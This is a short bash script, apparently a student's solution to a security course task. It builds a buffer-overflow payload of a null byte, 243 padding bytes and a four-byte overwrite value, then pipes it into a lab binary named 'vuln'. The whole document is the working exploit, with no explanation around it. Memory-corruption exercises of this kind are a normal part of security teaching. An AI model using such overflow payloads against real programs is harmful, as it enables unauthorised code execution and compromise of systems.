#!/usr/bin/env bash
ENTERED_PWD='\0'
PADDING=$(printf 'a%.s' {1..243})
ROOSTER='\xe4\x88\xff\x43'
echo -en $ENTERED_PWD$PADDING$ROOSTER$ENTERED_PWD | /task1/s2015345/vuln